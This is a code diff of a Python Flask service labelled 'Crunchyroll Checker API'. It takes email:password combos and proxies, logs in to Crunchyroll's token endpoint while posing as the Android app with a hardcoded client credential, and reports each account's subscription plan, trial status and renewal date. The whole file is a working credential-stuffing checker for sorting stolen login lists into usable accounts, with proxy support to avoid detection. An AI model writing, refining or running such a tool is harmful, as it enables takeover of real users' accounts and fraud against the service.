@@ -1,22 +1,21 @@
 from flask import Flask, request, jsonify
 import requests
 from urllib.parse import quote
-from datetime import datetime
-import pytz
 import json
 
 app = Flask(__name__)
 
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"
-
-def format_proxy(proxy_string):
-    if not proxy_string:
+# ----------------------------
+# Utility: Proxy Formatter
+# ----------------------------
+def format_proxy(proxy):
+    if not proxy:
         return None
-    if "@" in proxy_string:
-        if not proxy_string.startswith("http"):
-            proxy_string = "http://" + proxy_string
-        return {"http": proxy_string, "https": proxy_string}
-    parts = proxy_string.split(":")
+    if "@" in proxy:
+        if not proxy.startswith("http"):
+            proxy = "http://" + proxy
+        return {"http": proxy, "https": proxy}
+    parts = proxy.split(":")
     if len(parts) == 4:
         ip, port, user, pwd = parts
         pstr = f"http://{user}:{pwd}@{ip}:{port}"
@@ -27,161 +26,138 @@ def format_proxy(proxy_string):
         return {"http": pstr, "https": pstr}
     return None
 
-def curl_request(url, headers=None, post=None, proxy=None, timeout=25):
-    session = requests.Session()
+# ----------------------------
+# Utility: Curl-like Request
+# ----------------------------
+def curl_request(url, headers=None, data=None, proxy=None):
     proxies = format_proxy(proxy) if proxy else None
     try:
-        if post is not None:
-            res = session.post(url, headers=headers, data=post, proxies=proxies, timeout=timeout)
+        if data:
+            res = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=25)
         else:
-            res = session.get(url, headers=headers, proxies=proxies, timeout=timeout)
-        return res.text, res.status_code, None
+            res = requests.get(url, headers=headers, proxies=proxies, timeout=25)
+        return res.text, None, res.status_code
     except Exception as e:
-        return None, None, str(e)
+        return None, str(e), None
 
-def get_access_token(email, password, proxy=None):
+# ----------------------------
+# / route
+# ----------------------------
+@app.route("/")
+def home():
+    return jsonify({
+        "message": "Crunchyroll Checker API",
+        "usage": "/check?email=email:pass&proxy=proxy&raw=1"
+    })
+
+# ----------------------------
+# /check endpoint
+# ----------------------------
+@app.route("/check")
+def check():
+    combo = request.args.get("email", "").strip()
+    proxy = request.args.get("proxy", "").strip()
+    raw = "raw" in request.args
+
+    if not combo or ":" not in combo:
+        return jsonify({"error": "Use ?email=email:pass&proxy=proxy"}), 400
+
+    email, password = combo.split(":", 1)
+    if not email or not password:
+        return jsonify({"error": "Missing email or password"}), 400
+
+    # --- Step 1: Get Access Token ---
     url = "https://beta-api.crunchyroll.com/auth/v1/token"
     headers = {
         "User-Agent": "Crunchyroll/3.78.3 Android/9 okhttp/4.12.0",
         "Authorization": "Basic bWZsbzhqeHF1cTFxeWJwdmY3cXA6VEFlTU9SRDBGRFhpdGMtd0l6TVVfWmJORVRRT2pXWXg=",
         "Content-Type": "application/x-www-form-urlencoded"
     }
-    data = f"username={quote(email)}&password={quote(password)}&grant_type=password&scope=offline_access&device_id=14427c33-1893-4bc5-aaf3-dea072be2831&device_type=Chrome%20on%20Android"
+    data = {
+        "username": email,
+        "password": password,
+        "grant_type": "password",
+        "scope": "offline_access",
+        "device_id": "14427c33-1893-4bc5-aaf3-dea072be2831",
+        "device_type": "Chrome on Android"
+    }
 
-    res_text, status, err = curl_request(url, headers=headers, post=data, proxy=proxy)
+    res_text, err, status = curl_request(url, headers, data, proxy)
     if err:
-        return None, f"Curl Error: {err}", None
+        return jsonify({"error": f"Curl Error: {err}"})
 
+    # Proper JSON parsing
     try:
         json_res = json.loads(res_text)
     except Exception:
         json_res = None
 
-    if not json_res or json_res.get("error"):
-        return None, f"Invalid Credentials or Error: {json_res}", None
+    if raw:
+        return res_text, 200, {"Content-Type": "application/json"}
+
+    if not json_res or "error" in json_res:
+        return jsonify({
+            "account": f"{email}:{password}",
+            "status": "Invalid Credentials",
+            "raw": json_res or res_text
+        })
 
     token = json_res.get("access_token")
     if not token:
-        return None, "No access token received.", None
+        return jsonify({
+            "account": f"{email}:{password}",
+            "status": "No token received",
+            "raw": json_res
+        })
 
-    return token, None, json_res
-
-def fetch_account_details(token, proxy=None):
-    headers = {
-        "User-Agent": UA,
-        "Authorization": f"Bearer {token}",
-        "Accept": "application/json, text/plain, */*",
-        "Referer": "https://www.crunchyroll.com/account/membership"
+    # --- Step 2: Fetch Account Info ---
+    me_url = "https://www.crunchyroll.com/accounts/v1/me"
+    me_headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Authorization": f"Bearer {token}"
     }
-
-    me_text, me_status, me_err = curl_request("https://www.crunchyroll.com/accounts/v1/me", headers=headers, proxy=proxy)
-    if me_err:
-        return None, f"Error fetching account info: {me_err}", None
-
+    me_res, me_err, me_status = curl_request(me_url, me_headers, proxy=proxy)
     try:
-        me_json = json.loads(me_text)
+        me_json = json.loads(me_res)
     except Exception:
-        me_json = None
+        me_json = {}
 
-    if not me_json or "account_id" not in me_json:
-        return None, "No account_id found", me_text
+    account_id = me_json.get("account_id", "")
 
-    account_id = me_json["account_id"]
-
+    # --- Step 3: Subscriptions ---
     subs_url = f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions"
-    subs_text, subs_status, subs_err = curl_request(subs_url, headers=headers, proxy=proxy)
-    if subs_err:
-        return None, f"Error fetching subscriptions: {subs_err}", None
-
-    try:
-        subs_json = json.loads(subs_text)
-    except Exception:
-        subs_json = None
-
-    if not subs_json:
-        return None, "Failed to fetch subscriptions", subs_text
-
-    # Free account check
-    if subs_json.get("containerType") == "free":
-        return {
-            "account_id": account_id,
-            "plan": "Free",
-            "status": "free",
-            "trial": False,
-            "renewal": "N/A",
-            "days_left": "N/A"
-        }, None, subs_json
-
-    subs_list = subs_json.get("subscriptions", [])
-    if subs_list:
-        sub = subs_list[0]
-        plan = sub.get("plan", {}).get("tier", {}).get("text") or sub.get("plan", {}).get("name", {}).get("text") or "N/A"
-        status = sub.get("status", "N/A")
-        trial = sub.get("activeFreeTrial", False)
-        next_renewal = sub.get("nextRenewalDate", "N/A")
-
-        days_left = "N/A"
-        if next_renewal not in ["N/A", None]:
-            try:
-                renewal_dt = datetime.strptime(next_renewal, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
-                ist = pytz.timezone("Asia/Kolkata")
-                now = datetime.now(ist)
-                days_left = max(0, (renewal_dt.astimezone(ist) - now).days)
-            except Exception:
-                pass
-
-        return {
-            "account_id": account_id,
-            "plan": plan,
-            "status": status,
-            "trial": trial,
-            "renewal": next_renewal,
-            "days_left": days_left
-        }, None, subs_json
-
-    return {
-        "account_id": account_id,
-        "plan": "Unknown",
-        "status": "Unknown",
-        "trial": False,
-        "renewal": "N/A",
-        "days_left": "N/A"
-    }, None, subs_json
-
-@app.route("/check", methods=["GET", "POST"])
-def check():
-    combo = request.values.get("email", "").strip()
-    proxy = request.values.get("proxy", "")
-
-    if not combo or ":" not in combo:
-        return jsonify({"error": "Use ?email=email:pass&proxy=proxy"}), 400
-
-    email, password = combo.split(":", 1)
-
-    token, err, _ = get_access_token(email, password, proxy)
-    if not token:
-        return jsonify({"account": f"{email}:{password}", "error": err}), 200
-
-    details, err, _ = fetch_account_details(token, proxy)
-    if not details:
-        return jsonify({"account": f"{email}:{password}", "error": err}), 200
-
-    response = {
-        "account": f"{email}:{password}",
-        "account_id": details["account_id"],
-        "plan": details["plan"],
-        "status": details["status"],
-        "trial": details["trial"],
-        "next_renewal": details["renewal"],
-        "days_left": details["days_left"]
+    subs_headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Authorization": f"Bearer {token}",
+        "Accept": "application/json"
     }
-    return jsonify(response), 200
+    subs_res, subs_err, subs_status = curl_request(subs_url, subs_headers, proxy=proxy)
+    try:
+        subs_json = json.loads(subs_res)
+    except Exception:
+        subs_json = {}
 
-@app.route("/")
-def home():
+    if raw:
+        return subs_res, 200, {"Content-Type": "application/json"}
+
+    # --- Final Response ---
+    subscription = (subs_json.get("subscriptions") or [{}])[0]
+    plan_text = subscription.get("plan", {}).get("tier", {}).get("text", "Free")
+    status_text = subscription.get("status", "Unknown")
+    trial = subscription.get("activeFreeTrial", False)
+    renewal = subscription.get("nextRenewalDate", "N/A")
+
     return jsonify({
-        "message": "Crunchyroll Checker API",
-        "usage": "/check?email=email:pass&proxy=proxy (proxy optional)"
+        "account": f"{email}:{password}",
+        "status": status_text,
+        "plan": plan_text,
+        "trial": trial,
+        "renewal": renewal,
+        "raw": {
+            "login": json_res,
+            "me": me_json,
+            "subs": subs_json
+        }
     })
 
 if __name__ == "__main__":
